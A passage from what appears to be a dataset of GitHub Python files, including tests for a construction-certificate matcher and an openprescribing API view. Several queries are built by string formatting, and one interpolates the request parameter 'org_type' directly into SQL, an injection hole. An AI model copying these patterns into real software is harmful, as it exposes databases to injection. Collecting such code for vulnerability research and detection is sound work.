= data[0]\n    id_list = mail_ids.split()\n    results = []\n    if len(id_list):\n        for i, email_id in enumerate(id_list, 1):\n            _, data = server.fetch(email_id, '(RFC822)')\n            logger.info(f'parsing new email {i} of {len(id_list)}')\n            sender, subject, date, content = parse_email(data)\n            results.append({\"sender\": sender, \"subject\": subject, \"date\": date, \"content\": content})\n    server.logout()\n    return results\n\ndef scan_inbox():\n    for user_email in get_job_input_data():\n        try:    \n            if user_email['subject'].startswith(\"DO NOT MODIFY\"):  # e-mail generated by html form\n                logger.info(f'processing e-mail from {user_email[\"sender\"]} as user input via html form...')\n                process_as_form(user_email)\n            elif len(re.findall('\\d', user_email['content'])) >= 1:  # True if it's a response to a match notification email\n                logger.info(f'processing e-mail from {user_email[\"sender\"]} as user feedback via email response...')\n                process_as_reply(user_email)            \n        except (IndexError, AttributeError) as e:\n            logger.info(e)\n            logger.info(traceback.format_exc())\n            logger.warning(f'Could not process e-mail from {user_email[\"sender\"]}')\n\nif __name__==\"__main__\":\n    for filename in ['cert_db.sqlite3', 'rf_model.pkl', 'rf_features.pkl']:\n        try:\n            os.rename('temp_'+filename, filename)\n        except:\n            pass\n    scan_inbox()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/confirmationbias616/certificate_checker/blob/bd1e42e85f5b5fb2a88cd7050c8d845dc3554fa5",
        "file_path": "/tests.py",
        "source": "import unittest\nimport pandas as pd\nimport numpy as np\nimport datetime\nfrom ddt import ddt, data, unpack\nfrom scraper import scrape\nfrom wrangler import clean_job_number, clean_pub_date, clean_city, clean_company_name, get_acronyms, get_street_number, get_street_name, clean_title, wrangle\nfrom matcher import match\nfrom communicator import communicate\nfrom inbox_scanner import process_as_form, process_as_reply\nfrom ml import build_train_set, train_model, validate_model\nfrom db_tools import create_connection\nfrom test.test_setup import create_test_db\nimport os\n\n\nprob_thresh = 0.7\n@ddt\nclass TestWrangleFuncs(unittest.TestCase):\n\n    @data(\n        (\" \", \"\"),\n        (\"\\n  #2404\\n\", \"2404\"),\n        (\"no. 2404\", \"2404\"),\n        (\"# 2404\", \"2404\"),\n        (\"#2404\", \"2404\"),\n        (\"2404\", \"2404\"),\n    )\n    @unpack\n    def test_clean_job_number(self, input_string, desired_string):\n        output_string = clean_job_number(input_string)\n        self.assertEqual(desired_string, output_string)\n\n    @data(\n        (\" \", \"\"),\n        (\"\\n  2019-02-20\\n\", \"2019-02-20\"),\n        (\"2019-02-20\", \"2019-02-20\"),\n        (\" 2019-02-20 \", \"2019-02-20\"),\n    )\n    @unpack\n    def test_clean_pub_date(self, input_string, desired_string):\n        output_string = clean_pub_date(input_string)\n        self.assertEqual(desired_string, output_string)\n\n    @data(\n        (\" \", \"\"),\n        (\"Timmins ON, South Porcupine ON, Temagami ON & New Liskeard ON\", \"timmin\"),\n        (\"Ottawa, Ontario\", \"ottawa\"),\n        (\"Frontenac County, City of Kingston, Selma Subdivision, Ontario\", \"kingston\"),\n        (\"Kingston\", \"kingston\"),\n        (\"Kingston, Ontario\", \"kingston\"),\n        (\"Kingston Ontario\", \"kingston\"),\n        (\"Kingston ON\", \"kingston\"),\n        (\"Kingston\", \"kingston\"),\n        (\"Township of South Algonquin\", \"southalgonquin\"),\n        (\"City of Greater Sudbury\", \"sudbury\"),\n        (\"Cochrane District, City of Timmins\", \"timmin\"),\n        (\"Brampton/Mississauga\", \"brampton&mississauga\"),\n        (\"City of Kitchener - Building Department\", \"kitchener\"),\n        (\"City of Ottawa, Ontario, Canada\", \"ottawa\"),\n        (\"Essex County\", \"essex\"),\n        (\"Etobicoke - City of Toronto\", \"toronto\"),\n        (\"Halton Region, City of Burlington\", \"burlington\"),\n        (\"Municipality of Chatham-Kent\", \"chathamkent\"),\n        (\"Municipality of Chatham Kent\", \"chathamkent\"),\n        (\"Municipality of Chatham  Kent\", \"chathamkent\"),\n        (\"Municipality of ChathamKent\", \"chathamkent\"),\n        (\"York Region\", \"york\"),\n        (\"Corporation of the City of North Bay\", \"northbay\"),\n        (\"Elgin County/City of St. Thomas\", \"st.thoma\"),\n        (\"Durham Region, Town of Whitby\", \"whitby\"),\n        (\"Hastings County, Municipality Faraday\", \"faraday\"),\n        (\"Regional Municipality of Windsor\", \"windsor\"),\n        (\"Niagara Region, City of St. Catharines, Canada\", \"st.catharine\"),\n        (\"York Region, Town of Markham\", \"markham\"),\n        (\"Town of Wasaga Beach\", \"wasagabeach\"),\n        (\"Ottawa-Carleton\", \"ottawa\")\n    )\n    @unpack\n    def test_clean_city(self, input_string, desired_string):\n        output_string = clean_city(input_string)\n        self.assertEqual(desired_string, output_string)\n\n    @data(\n        (\" \", \"\"),\n        (\"Frecon\", \"frecon\"),\n        (\"Frecon\", \"frecon\"),\n        (\"PCL Constructors\", \"pcl\"),\n        (\"Universit d'Ottawa\", \"universiteottawa\"),\n        (\"Dilfo Mechanical Ltd.\", \"dilfo\"),\n        (\"Dilfo Mechanical Ltd\", \"dilfo\"),\n        (\"Dilfo Mechanical Limited\", \"dilfo\"),\n        (\"Graceview Enterprises Inc.\", \"graceview\"),\n        (\"Dilfo HVAC Services Inc\", \"dilfo\"),\n        (\"S&R Mechanical\", \"s&r\"),\n        (\"s and r mech\", \"s&r\"),\n        (\"srmech\", \"sr\"),\n        (\"G&L Insulation\", \"g&l\"),\n        (\"8906785 Canada Inc. O/A R.E. Hein Construction (Ontario)\", \"rehein\"),\n        ('PCL Constructors Canada Inc. for GAL Power Systems', 'pcl')\n    )\n    @unpack\n    def test_clean_company_name(self, input_string, desired_string):\n        output_string = clean_company_name(input_string)\n        self.assertEqual(desired_string, output_string)\n\n    @data(\n        (\" \", []),\n        (\"Ron Eastern Construction Ltd. (RECL)\", [\"RECL\"]),\n        (\"RECL\", [\"RECL\"]),\n        (\"Ellis Don for BGIS\", [\"BGIS\"]),\n        (\"ED/BGIS\", [\"BGIS\"]),\n        (\"Ron Eastern Construction Limited (RECL) for PWGSC\", [\"RECL\", \"PWGSC\"]),\n        (\"Ron Eastern Construction Limited\", []),\n    )\n    @unpack\n    def test_get_acronyms(self, input_string, desired_string):\n        output_string = get_acronyms(input_string)\n        self.assertEqual(desired_string, output_string)\n\n    address_test_data = (\n        (\"123 Fake St.\", \"123\", \"fake\"),\n        (\"12 Carrire Rd\", \"12\", \"carriere\"),\n        (\"8-1230 marenger street\", \"1230\", \"marenger\"),\n        (\"apt. 8, 1230 marenger street\", \"1230\", \"marenger\"),\n        (\"8-1230 marenger street, apt. 8, \", \"1230\", \"marenger\"),\n        (\"1230 apt. 8, marenger street\", \"1230\", \"marenger\"),\n        (\"1010 talbot st. unit #1\", \"1010\", \"talbot\"),\n        (\"6250 st albans court\", \"6250\", \"albans\"),\n        (\"6250 saint albans court\", \"6250\", \"albans\"),\n        (\"6250 st. albans\", \"6250\", \"albans\"),\n        (\"6250 st-albans CRT\", \"6250\", \"albans\"),\n        (\"University of Ottawa, Faculty of Medicine and Faculty of Health Sciences, Roger Guindon Hall, 451 Smyth Road, Ottawa, Ontario K1H 8L1\", \"451\", \"smyth\"),\n        (\"145 Jean-Jacques Lussier\", \"145\", \"jean-jacques\"),\n        (\"Edwardsburgh/Cardinal\", \"\", \"\"),\n    )\n    @data(*address_test_data)\n    @unpack\n    def test_get_street_number(self, input_string, desired_string1, desired_string2):\n        output_string = get_street_number(input_string)\n        self.assertEqual(desired_string1, output_string)\n    @data(*address_test_data)\n    @unpack\n    def test_get_street_name(self, input_string, desired_string1, desired_string2):\n        output_string = get_street_name(input_string)\n        self.assertEqual(desired_string2, output_string)\n\n    @data(\n        (\" \", \"\"),\n        (\"test\", \"test\"),\n        (\"test\", \"teste\"),\n    )\n    @unpack\n    def test_clean_title(self, input_string, desired_string):\n        output_string = clean_title(input_string)\n        self.assertEqual(desired_string, output_string)\n\n@ddt\nclass InputTests(unittest.TestCase):\n    def setUpClass():\n        # the import statement below runs some code automatically\n        for filename in ['cert_db.sqlite3', 'rf_model.pkl', 'rf_features.pkl']:\n            try:\n                os.rename(filename, 'temp_'+filename)\n            except FileNotFoundError:\n                pass\n        create_test_db()\n        for filename in ['cert_db.sqlite3', 'rf_model.pkl', 'rf_features.pkl']:\n            try:\n                os.rename('test_'+filename, filename)\n            except FileNotFoundError:\n                pass\n    \n    def tearDownClass():\n        for filename in ['cert_db.sqlite3', 'rf_model.pkl', 'rf_features.pkl']:\n            try:\n                os.rename('temp_'+filename, filename)\n            except FileNotFoundError:\n                try:\n                    os.remove(filename)\n                except FileNotFoundError:\n                    pass\n                \n\n    @data(\n        ('9981', 'B0046A36-3F1C-11E9-9A87-005056AA6F11', 0, 0, 0),\n        ('9982', 'B0046A36-3F1C-11E9-9A87-005056AA6F12', 0, 0, 1),\n        ('9983', 'B0046A36-3F1C-11E9-9A87-005056AA6F13', 1, 0, 1),\n        ('9984', 'B0046A36-3F1C-11E9-9A87-005056AA6F14', 1, 1, 1),\n        ('9985', '', 0, 0, 0),\n        ('9986', '', 0, 0, 1),\n        ('9987', '', 1, 0, 1),\n        ('9988', '', 1, 1, 1),\n    )\n    @unpack\n    def test_process_as_form(self, job_number, dcn_key, was_prev_matched,\n            was_prev_closed, was_prev_tracked):\n        email_obj = {\n            'sender' : \"Alex Roy <Alex.Roy@dilfo.com>\",\n            'subject' : \"DO NOT MODIFY MESSAGE BELOW - JUST HIT `SEND`\",\n            'date' : \"Tue, 7 May 2019 17:34:17 +0000\",\n            'content' : (\n                f\"job_number={job_number}&title=TEST_ENTRY&city=Ottawa&\"\n                f\"address=2562+Del+Zotto+Ave.%2C+Ottawa%2C+Ontario&\"\n                f\"contractor=GCN&engineer=Goodkey&owner=Douglas+Stalker&\"\n                f\"quality=2&cc_email=&link_to_cert={dcn_key}\\r\\n\"\n            )\n        }\n        # set-up new entries in db, if necessary\n        fake_dilfo_insert = \"\"\"\n            INSERT INTO df_dilfo (job_number, receiver_email, closed)\n            VALUES ({}, 'alex.roy616@gmail.com', {})\n        \"\"\"\n        fake_match_insert = \"\"\"\n            INSERT INTO df_matched (job_number, verifier, ground_truth)\n            VALUES ({}, 'alex.roy616@gmail.com', {})\n        \"\"\"\n        with create_connection() as conn:\n            if was_prev_closed or was_prev_tracked:\n                conn.cursor().execute(fake_dilfo_insert.format(job_number, was_prev_closed))\n            if was_prev_matched:\n                if was_prev_closed:\n                    conn.cursor().execute(fake_match_insert.format(job_number, 1))\n                else:\n                    conn.cursor().execute(fake_match_insert.format(job_number, 0))\n        with create_connection() as conn:\n            df_dilfo_pre = pd.read_sql(f\"SELECT * FROM df_dilfo WHERE job_number={job_number}\", conn)\n            df_matched_pre = pd.read_sql(f\"SELECT * FROM df_matched WHERE job_number={job_number}\", conn)\n        process_as_form(email_obj)\n        # make assertions about db now that reply has been processed\n        with create_connection() as conn:\n            df_dilfo_post = pd.read_sql(f\"SELECT * FROM df_dilfo WHERE job_number={job_number}\", conn)\n            df_matched_post = pd.read_sql(f\"SELECT * FROM df_matched WHERE job_number={job_number}\", conn)\n        self.assertEqual(len(df_dilfo_post), 1)\n        self.assertEqual(bool(df_dilfo_post.iloc[0].closed), bool(was_prev_closed or dcn_key))\n        self.assertEqual(any(df_matched_post.ground_truth), bool(was_prev_closed or dcn_key))\n        self.assertEqual(len(df_matched_pre) + bool(dcn_key and not(was_prev_closed)), len(df_matched_post))\n        self.assertEqual(list(df_matched_pre.columns), list(df_matched_post.columns))\n        self.assertEqual(list(df_dilfo_pre.columns), list(df_dilfo_post.columns))\n\n\n    @data(\n        ('9991', 'B0046A36-3F1C-11E9-9A87-005056AA6F01', 0, 0, 0),\n        ('9992', 'B0046A36-3F1C-11E9-9A87-005056AA6F02', 0, 1, 0),\n        ('9993', 'B0046A36-3F1C-11E9-9A87-005056AA6F03', 0, 1, 1),\n        ('9994', 'B0046A36-3F1C-11E9-9A87-005056AA6F04', 1, 0, 0),\n        ('9995', 'B0046A36-3F1C-11E9-9A87-005056AA6F05', 1, 1, 0),\n        ('9996', 'B0046A36-3F1C-11E9-9A87-005056AA6F06', 1, 1, 1),\n    )\n    @unpack\n    def test_process_as_reply(self, job_number, dcn_key, ground_truth,\n            was_prev_matched, was_prev_closed):\n        email_obj = {\n            'sender' : \"Alex Roy <Alex.Roy@dilfo.com>\",\n            'subject' : f\"Re: [EXTERNAL] Upcoming Holdback Release: #{job_number}\",\n            'date' : \"Thu, 30 May 2019 00:41:05 +0000\",\n            'content' : (\n                f\"{ground_truth}\\r\\n\\r\\nAlex Roy\\r\\nDilfo Mechanical\\r\\n(613) 899-9324\\r\\n\\r\\n\"\n                f\"________________________________\\r\\nFrom: Dilfo HBR Bot \"\n                f\"<dilfo.hb.release@gmail.com>\\r\\nSent: Wednesday, May 29, 2019 8:40 \"\n                f\"PM\\r\\nTo: Alex Roy\\r\\nSubject: [EXTERNAL] #{job_number} - Upcoming \"\n                f\"Holdback Release\\r\\n\\r\\nHi Alex,\\r\\n\\r\\nYou're receiving this \"\n                f\"e-mail notification because you added the project #{job_number} - DWS \"\n                f\"Building Expansion to the watchlist of upcoming holdback releases. \"\n                f\"\\r\\n\\r\\nBefore going any further, please follow the link below to \"\n                f\"make sure the algorithm correctly matched the project in \"\n                f\"question:\\r\\nhttps://link.spamstopshere.net/u/f544cec5/\"\n                f\"3CEdd3OC6RGV00Hm8I9C_g?u=https%3A%2F%2Fcanada.constructconnect\"\n                f\".com%2Fdcn%2Fcertificates-and-notices%2F%2F{dcn_key}\\r\\n\\r\\nIf it's the \"\n                f\"right project, then the \"\n                f\"certificate was just published this past Wednesday on March 6, \"\n                f\"2019. This means a valid holdback release invoice could be submitted \"\n                f\"as of:\\r\\nA) April 20, 2019 if the contract was signed before \"\n                f\"October 1, 2019 or;\\r\\nB) May 5, 2019 if the contract was signed \"\n                f\"since then.\\r\\n\\r\\nPlease be aware this is a fully automated message. \"\n                f\"The info presented above could be erroneous.\\r\\nYou can help improve \"\n                f\"the matching algorithms by replying to this e-mail with a simple `1` \"\n                f\"or `0` to confirm whether or not the linked certificate represents the \"\n                f\"project in question.\\r\\n\\r\\nThanks,\\r\\nDilfo HBR Bot\\r\\n\"\n            )\n        }\n        # set-up new entries in db, if necessary\n        fake_dilfo_insert = \"\"\"\n            INSERT INTO df_dilfo (job_number, closed)\n            VALUES ({}, {})\n        \"\"\"\n        fake_match_insert = \"\"\"\n            INSERT INTO df_matched (job_number, ground_truth)\n            VALUES ({}, {})\n        \"\"\"\n        with create_connection() as conn:\n            conn.cursor().execute(fake_dilfo_insert.format(job_number, was_prev_closed))\n            if was_prev_matched:\n                if was_prev_closed:\n                    conn.cursor().execute(fake_match_insert.format(job_number, 1))\n                else:\n                    conn.cursor().execute(fake_match_insert.format(job_number, 0))\n        with create_connection() as conn:\n            df_dilfo_pre = pd.read_sql(f\"SELECT * FROM df_dilfo WHERE job_number={job_number}\", conn)\n            df_matched_pre = pd.read_sql(f\"SELECT * FROM df_matched WHERE job_number={job_number}\", conn)\n        process_as_reply(email_obj)\n        # make assertions about db now that reply has been processed\n        with create_connection() as conn:\n            df_dilfo_post = pd.read_sql(f\"SELECT * FROM df_dilfo WHERE job_number={job_number}\", conn)\n            df_matched_post = pd.read_sql(f\"SELECT * FROM df_matched WHERE job_number={job_number}\", conn)\n        self.assertEqual(len(df_dilfo_pre), len(df_dilfo_post))\n        self.assertEqual(df_dilfo_post.iloc[0].closed, was_prev_closed or ground_truth)\n        self.assertEqual(any(df_matched_post.ground_truth), was_prev_closed or ground_truth)\n        self.assertEqual(len(df_matched_pre) + (not was_prev_closed), len(df_matched_post))\n        self.assertEqual(list(df_matched_pre.columns), list(df_matched_post.columns))\n        self.assertEqual(list(df_dilfo_pre.columns), list(df_dilfo_post.columns))\n\n\nclass IntegrationTests(unittest.TestCase):\n    def setUp(self):\n        # the import statement below runs some code automatically\n        for filename in ['cert_db.sqlite3', 'rf_model.pkl', 'rf_features.pkl']:\n            try:\n                os.rename(filename, 'temp_'+filename)\n            except FileNotFoundError:\n                pass\n        create_test_db()\n        for filename in ['cert_db.sqlite3', 'rf_model.pkl', 'rf_features.pkl']:\n            try:\n                os.rename('test_'+filename, filename)\n            except FileNotFoundError:\n                pass\n    \n    def tearDown(self):\n        for filename in ['cert_db.sqlite3', 'rf_model.pkl', 'rf_features.pkl']:\n            try:\n                os.rename('temp_'+filename, filename)\n            except FileNotFoundError:\n                try:\n                    os.remove(filename)\n                except FileNotFoundError:\n                    pass\n                \n    def test_scarpe_to_communicate(self):\n        test_limit = 3\n        web_df = scrape(limit=test_limit, test=True, since='week_ago')\n        self.assertEqual(len(web_df), test_limit)\n        match_first_query = \"SELECT * FROM df_dilfo WHERE closed=0 LIMIT 1\"\n        with create_connection() as conn:\n            dilfo_row = pd.read_sql(match_first_query, conn).iloc[0]\n        communicate(web_df, dilfo_row, test=True)  # This will not return legit matches.\n\n    def test_truth_table(self):        \n        build_train_set()\n        train_model(prob_thresh=prob_thresh)\n        match_query = \"\"\"\n                        SELECT \n                            df_dilfo.job_number,\n                            df_dilfo.city,\n                            df_dilfo.address,\n                            df_dilfo.title,\n                            df_dilfo.owner,\n                            df_dilfo.contractor,\n                            df_dilfo.engineer,\n                            df_dilfo.receiver_email,\n                            df_dilfo.cc_email,\n                            df_dilfo.quality,\n                            df_matched.dcn_key,\n                            df_matched.ground_truth\n                        FROM \n                            df_dilfo \n                        LEFT JOIN \n                            df_matched\n                        ON \n                            df_dilfo.job_number=df_matched.job_number\n                        WHERE \n                            df_dilfo.closed=1\n                        AND\n                            df_matched.ground_truth=1\n                        AND \n                            df_matched.validate=0\n                    \"\"\"\n        with create_connection() as conn:\n            test_df_dilfo = pd.read_sql(match_query, conn)\n        test_web_df = scrape(ref=test_df_dilfo)\n        results = match(df_dilfo=test_df_dilfo, df_web=test_web_df, test=True, prob_thresh=prob_thresh, version='new')\n        \n        # confrim 100% recall with below assert\n        qty_actual_matches = int(len(results)**0.5)\n        qty_found_matches = results[results.pred_match == 1].title.nunique()\n        self.assertTrue(qty_found_matches == qty_actual_matches, msg=f\"qty_found_matches({qty_found_matches}) not equal qty_actual_matches({qty_actual_matches})\")\n        \n        # make sure not more than 25% false positives with below assert\n        false_positives = len(results[results.pred_match == 1]) - qty_found_matches\n        self.assertTrue(false_positives <= round(qty_actual_matches*0.25,1), msg=f\"found too many false positives ({false_positives}) out of total test projects ({qty_actual_matches})\")\n\n        # test single sample\n        sample_dilfo = pd.DataFrame({\n            'job_number':'2387',\n            'city':'Ottawa',\n            'address':'2562 Del Zotto Ave., Ottawa, Ontario',\n            'title':'DWS Building Expansion',\n            'owner':'Douglas Stalker',\n            'contractor':'GNC',\n            'engineer':'Goodkey',\n            'receiver_email':'alex.roy@dilfo.com',\n            'cc_email':'',\n            'quality':'2',\n            'closed':'0',\n            }, index=range(1))\n        sample_web = pd.DataFrame({\n            'pub_date':'2019-03-06',\n            'city':'Ottawa-Carleton',\n            'address':'2562 Del Zotto Avenue, Gloucester, Ontario',\n            'title':'Construct a 1 storey storage addition to a 2 storey office/industrial building',\n            'owner':'Doug Stalker, DWS Roofing',\n            'contractor':'GNC Constructors Inc.',\n            'engineer':None,\n            'dcn_key':'B0046A36-3F1C-11E9-9A87-005056AA6F02',\n            }, index=range(1))\n        is_match, prob = match(df_dilfo=sample_dilfo, df_web=sample_web, test=True, version='new').iloc[0][['pred_match','pred_prob']]\n        self.assertTrue(is_match, msg=f\"Project #{sample_dilfo.job_number} did not match successfully. Match probability returned was {prob}.\") \n\n        # test same sample but using db retreival\n        results = match(df_dilfo=sample_dilfo, since='2019-03-05', until='2019-03-07', test=True, version='new')\n        prob_from_db_cert = results[results.contractor == 'gnc'].iloc[0].pred_prob  #'gnc' is what is returned from the wrangling funcs\n        self.assertTrue(round(prob, 2) == round(prob_from_db_cert, 2))\n\n        # make sure validation runs\n        validate_model(prob_thresh=prob_thresh, test=True)\n\nif __name__ == '__main__':\n    for filename in ['cert_db.sqlite3', 'rf_model.pkl', 'rf_features.pkl']:\n        try:\n            os.rename('temp_'+filename, filename)\n        except:\n            pass\n    unittest.main(verbosity=2)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ebmdatalab/openprescribing/blob/8c5717cb902b2e1201cce716442dd8ca3a123a25",
        "file_path": "/openprescribing/api/views_measures.py",
        "source": "import re\n\nfrom dateutil.relativedelta import relativedelta\n\nfrom rest_framework.decorators import api_view\nfrom rest_framework.exceptions import APIException\nfrom rest_framework.response import Response\n\nfrom frontend.measure_tags import MEASURE_TAGS\nfrom frontend.models import ImportLog\nfrom frontend.models import Measure\nfrom frontend.models import MeasureGlobal\nfrom frontend.models import MeasureValue\n\nimport view_utils as utils\n\n\nclass MissingParameter(APIException):\n    status_code = 400\n    default_detail = 'You are missing a required parameter.'\n\n\nclass InvalidMultiParameter(APIException):\n    status_code = 400\n    default_detail = ('You can specify one org and many measures, '\n                      'or one measure and many orgs, but not many of both')\n\n\n@api_view(['GET'])\ndef measure_global(request, format=None):\n    measures = utils.param_to_list(request.query_params.get('measure', None))\n    tags = utils.param_to_list(request.query_params.get('tags', None))\n    qs = MeasureGlobal.objects.select_related('measure')\n    if measures:\n        qs = qs.filter(measure_id__in=measures)\n    if tags:\n        qs = qs.filter(measure__tags__overlap=tags)\n    qs = qs.order_by('measure_id', 'month')\n    rolled = {}\n    for mg in qs:\n        id = mg.measure_id\n        d_copy = {\n            'date': mg.month,\n            'numerator': mg.numerator,\n            'denominator': mg.denominator,\n            'calc_value': mg.calc_value,\n            'percentiles': mg.percentiles,\n            'cost_savings': mg.cost_savings\n        }\n        if id in rolled:\n            rolled[id]['data'].append(d_copy)\n        else:\n            measure = mg.measure\n            if measure.tags_focus:\n                tags_focus = ','.join(measure.tags_focus)\n            else:\n                tags_focus = ''\n            rolled[id] = {\n                'id': id,\n                'name': measure.name,\n                'title': measure.title,\n                'description': measure.description,\n                'why_it_matters': measure.why_it_matters,\n                'numerator_short': measure.numerator_short,\n                'denominator_short': measure.denominator_short,\n                'url': measure.url,\n                'is_cost_based': measure.is_cost_based,\n                'is_percentage': measure.is_percentage,\n                'low_is_good': measure.low_is_good,\n                'tags_focus': tags_focus,\n                'numerator_is_list_of_bnf_codes': measure.numerator_is_list_of_bnf_codes,\n                'tags': _hydrate_tags(measure.tags),\n                'data': [d_copy]\n            }\n    d = {\n        'measures': [rolled[k] for k in rolled]\n    }\n\n    return Response(d)\n\n\ndef _get_org_id_and_type_from_request(request):\n    \"\"\"Return an (org_id, org_type) tuple from the request, normalised\n    for various backward-compatibilities.\n\n    Returns (None, None) if no org is specified in the request.\n\n    \"\"\"\n    org_id = utils.param_to_list(request.query_params.get('org', []))\n    org_id = org_id and org_id[0]\n    org_type = None\n    if 'org_type' in request.query_params:\n        org_type = request.query_params['org_type'] + '_id'\n        if org_type in ['pct_id', 'ccg_id']:\n            org_type = 'pr.ccg_id'\n    elif org_id:\n        # This is here for backwards compatibility, in case anybody else is\n        # using the API.  Now we have measures for regional teams, we cannot\n        # guess the type of an org by the length of its code, as both CCGs and\n        # regional teams have codes of length 3.\n        if len(org_id) == 3:\n            org_type = 'pr.ccg_id'\n        elif len(org_id) == 6:\n            org_type = 'practice_id'\n        else:\n            assert False, 'Unexpected org: {}'.format(org_id)\n    return (org_id, org_type)\n\n\n@api_view(['GET'])\ndef measure_numerators_by_org(request, format=None):\n    measure = request.query_params.get('measure', None)\n    org_id, org_type = _get_org_id_and_type_from_request(request)\n    this_month = ImportLog.objects.latest_in_category('prescribing').current_at\n    three_months_ago = (\n        this_month - relativedelta(months=2)).strftime('%Y-%m-01')\n    m = Measure.objects.get(pk=measure)\n    if m.numerator_is_list_of_bnf_codes:\n        if org_type in ['stp_id', 'regional_team_id']:\n            extra_join = '''\n            INNER JOIN frontend_practice pr\n            ON p.practice_id = pr.code\n            INNER JOIN frontend_pct\n            ON frontend_pct.code = pr.ccg_id\n            '''\n        elif org_type == 'pr.ccg_id':\n            extra_join = '''\n            INNER JOIN frontend_practice pr\n            ON p.practice_id = pr.code\n            '''\n        else:\n            extra_join = ''\n\n        # For measures whose numerator sums one of the columns in the\n        # prescribing table, we order the presentations by that column.\n        # For other measures, the columns used to calculate the numerator is\n        # not available here (it's in BQ) so we order by total_items, which is\n        # the best we can do.\n        #\n        # But because the columns in BQ don't match the columns in PG (items vs\n        # total_items), and because we alias a column in the query below\n        # (actual_cost vs cost) we need to translate the name of the column we\n        # use for ordering the results.\n        match = re.match(\n            'SUM\\((items|quantity|actual_cost)\\) AS numerator',\n            m.numerator_columns\n        )\n\n        if match:\n            order_col = {\n                'items': 'total_items',\n                'actual_cost': 'cost',\n                'quantity': 'quantity',\n            }[match.groups()[0]]\n        else:\n            order_col = 'total_items'\n\n        # The redundancy in the following column names is so we can\n        # support various flavours of `WHERE` clause from the measure\n        # definitions that may use a subset of any of these column\n        # names\n        focus_on_org = org_id and org_type\n        params = {\n            \"numerator_bnf_codes\": m.numerator_bnf_codes,\n            \"three_months_ago\": three_months_ago,\n        }\n        if focus_on_org:\n            org_condition = \"{org_type} = %(org_id)s AND \".format(\n                org_type=org_type)\n            org_group = \"{org_type}, \".format(\n                org_type=org_type)\n            params[\"org_id\"] = org_id\n        else:\n            org_condition = \"\"\n            org_group = \"\"\n        query = \"\"\"\n            SELECT\n              presentation_code AS bnf_code,\n              pn.name AS presentation_name,\n              SUM(total_items) AS total_items,\n              SUM(actual_cost) AS cost,\n              SUM(quantity) AS quantity\n            FROM\n              frontend_prescription p\n            INNER JOIN\n              frontend_presentation pn\n            ON p.presentation_code = pn.bnf_code\n            {extra_join}\n            WHERE\n              {org_condition}\n              processing_date >= %(three_months_ago)s\n              AND\n              pn.bnf_code = ANY(%(numerator_bnf_codes)s)\n            GROUP BY\n              {org_group}\n              presentation_code, pn.name\n            ORDER BY {order_col} DESC\n            LIMIT 50\n        \"\"\".format(\n            org_condition=org_condition,\n            org_group=org_group,\n            org_type=org_type,\n            three_months_ago=three_months_ago,\n            extra_join=extra_join,\n            order_col=order_col,\n        )\n        data = utils.execute_query(query, params)\n    else:\n        data = []\n    response = Response(data)\n    filename = \"%s-%s-breakdown.csv\" % (measure, org_id)\n    if request.accepted_renderer.format == 'csv':\n        response['content-disposition'] = \"attachment; filename=%s\" % filename\n    return response\n\n\n@api_view(['GET'])\ndef measure_by_regional_team(request, format=None):\n    return _measure_by_org(request, 'regional_team')\n\n\n@api_view(['GET'])\ndef measure_by_stp(request, format=None):\n    return _measure_by_org(request, 'stp')\n\n\n@api_view(['GET'])\ndef measure_by_ccg(request, format=None):\n    return _measure_by_org(request, 'ccg')\n\n\n@api_view(['GET'])\ndef measure_by_practice(request, format=None):\n    return _measure_by_org(request, 'practice')\n\n\ndef _measure_by_org(request, org_type):\n    measure_ids = utils.param_to_list(request.query_params.get('measure', None))\n    tags = utils.param_to_list(request.query_params.get('tags', []))\n    org_ids = utils.param_to_list(request.query_params.get('org', []))\n    parent_org_type = request.query_params.get('parent_org_type', None)\n    aggregate = bool(request.query_params.get('aggregate'))\n\n    if org_type == 'practice' and not (org_ids or aggregate):\n        raise MissingParameter\n    if len(org_ids) > 1 and len(measure_ids) > 1:\n        raise InvalidMultiParameter\n\n    if parent_org_type is None:\n        if org_type == 'practice' and org_ids:\n            l = len(org_ids[0])\n            assert all(len(org_id) == l for org_id in org_ids)\n\n            if l == 3:\n                parent_org_type = 'pct'\n            elif l == 6:\n                parent_org_type = 'practice'\n            else:\n                assert False, l\n        else:\n            parent_org_type = org_type\n\n    measure_values = MeasureValue.objects.by_org(\n        org_type,\n        parent_org_type,\n        org_ids,\n        measure_ids,\n        tags,\n    )\n\n    # Because we access the `name` of the related org for each MeasureValue\n    # during the roll-up process below we need to prefetch them to avoid doing\n    # N+1 db queries\n    org_field = org_type if org_type != 'ccg' else 'pct'\n    measure_values = measure_values.prefetch_related(org_field)\n\n    if aggregate:\n        measure_values = measure_values.aggregate_by_measure_and_month()\n\n    rsp_data = {\n        'measures': _roll_up_measure_values(measure_values, org_type)\n    }\n    return Response(rsp_data)\n\n\ndef _roll_up_measure_values(measure_values, org_type):\n    rolled = {}\n\n    for measure_value in measure_values:\n        measure_id = measure_value.measure_id\n        measure_value_data = {\n            'date': measure_value.month,\n            'numerator': measure_value.numerator,\n            'denominator': measure_value.denominator,\n            'calc_value': measure_value.calc_value,\n            'percentile': measure_value.percentile,\n            'cost_savings': measure_value.cost_savings,\n        }\n\n        if org_type == 'practice':\n            if measure_value.practice_id:\n                measure_value_data.update({\n                    'practice_id': measure_value.practice_id,\n                    'practice_name': measure_value.practice.name,\n                })\n        elif org_type == 'ccg':\n            if measure_value.pct_id:\n                measure_value_data.update({\n                    'pct_id': measure_value.pct_id,\n                    'pct_name': measure_value.pct.name,\n                })\n        elif org_type == 'stp':\n            if measure_value.stp_id:\n                measure_value_data.update({\n                    'stp_id': measure_value.stp_id,\n                    'stp_name': measure_value.stp.name,\n                })\n        elif org_type == 'regional_team':\n            if measure_value.regional_team_id:\n                measure_value_data.update({\n                    'regional_team_id': measure_value.regional_team_id,\n                    'regional_team_name': measure_value.regional_team.name,\n                })\n        else:\n            assert False\n\n        if measure_id in rolled:\n            rolled[measure_id]['data'].append(measure_value_data)\n        else:\n            measure = measure_value.measure\n            rolled[measure_id] = {\n                'id': measure_id,\n                'name': measure.name,\n                'title': measure.title,\n                'description': measure.description,\n                'why_it_matters': measure.why_it_matters,\n                'numerator_short': measure.numerator_short,\n                'denominator_short': measure.denominator_short,\n                'url': measure.url,\n                'is_cost_based': measure.is_cost_based,\n                'is_percentage': measure.is_percentage,\n                'low_is_good': measure.low_is_good,\n                'tags': _hydrate_tags(measure.tags),\n                'data': [measure_value_data],\n            }\n\n    return rolled.values()\n\n\ndef _hydrate_tags(tag_ids):\n    